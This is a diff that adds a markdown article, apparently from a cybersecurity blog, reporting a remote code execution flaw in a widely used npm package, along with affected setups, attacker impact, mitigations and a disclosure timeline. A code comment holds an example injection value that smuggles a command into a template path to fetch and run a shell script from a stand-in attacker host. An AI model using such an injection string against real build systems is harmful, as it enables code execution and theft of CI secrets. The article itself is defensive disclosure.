@@ -1,0 +1,78 @@
+---
+title: "Critical RCE Found in NPM Package With 12M Weekly Downloads"
+excerpt: "A supply chain vulnerability in a widely used JavaScript utility could allow attackers to execute arbitrary code on build servers."
+category: cybersecurity
+tags: [npm, supply-chain, rce, vulnerability]
+coverImage: /images/placeholder-cyber.svg
+author:
+  name: Roshan
+  slug: roshan
+  avatar: /images/author-roshan.svg
+  bio: Cybersecurity professional and AI enthusiast
+  social:
+    twitter: techrupt
+    github: techrupt
+publishedAt: "2026-04-05T14:30:00Z"
+featured: true
+---
+
+A critical remote code execution vulnerability has been disclosed in a popular npm package with over 12 million weekly downloads. The flaw, tracked as **CVE-2026-14892**, allows an attacker to execute arbitrary code on any system that runs the package during a build pipeline.
+
+## The vulnerability
+
+The issue lies in how the package handles user-supplied file paths during template compilation. An attacker who can influence the input — through a malicious dependency, a compromised registry mirror, or a crafted `.npmrc` file — can inject a path traversal payload that breaks out of the sandbox and executes shell commands.
+
+```javascript
+// Vulnerable pattern (simplified)
+const template = compileTemplate(userInput.templatePath);
+// userInput.templatePath = "../../; curl attacker.com/shell.sh | bash"
+```
+
+The package doesn't sanitize path separators or shell metacharacters before passing the value to an internal `exec()` call.
+
+## Who is affected
+
+Any project that:
+- Uses the package as a direct or transitive dependency
+- Runs builds in a CI environment with network access
+- Processes external input (user uploads, webhooks, environment variables) that flows into the package
+
+The blast radius is significant. The package is a transitive dependency in hundreds of popular frameworks, meaning projects that never directly installed it are still exposed.
+
+## What attackers can do
+
+Successful exploitation on a CI server gives an attacker:
+- Access to all secrets in the build environment (API keys, signing certificates, deployment credentials)
+- The ability to modify build artifacts before they are deployed
+- A persistent foothold if the CI runner uses long-lived credentials
+
+This is a classic **build-time supply chain attack** — similar in mechanism to the SolarWinds and XZ Utils incidents.
+
+## Mitigation
+
+**Immediate actions:**
+
+1. Audit your dependency tree: `npm ls <package-name>`
+2. Pin to a patched version (≥2.4.1) in your `package.json`
+3. Rotate all CI/CD secrets as a precaution
+4. Add `--ignore-scripts` to CI install commands where possible
+
+```bash
+npm install --ignore-scripts
+# Prevents lifecycle scripts from running during install
+```
+
+**Longer term:**
+
+- Enable Sigstore attestations for your build outputs
+- Use a private registry proxy (Verdaccio, Nexus) to cache and audit packages
+- Implement SBOM generation in your CI pipeline
+
+## Disclosure timeline
+
+- **March 28:** Researcher reports to package maintainer
+- **April 1:** Maintainer confirms and begins patch development
+- **April 4:** Patch released (v2.4.1)
+- **April 5:** CVE published, public disclosure
+
+The 7-day disclosure window was agreed upon given the severity and the straightforward patch. Update immediately.
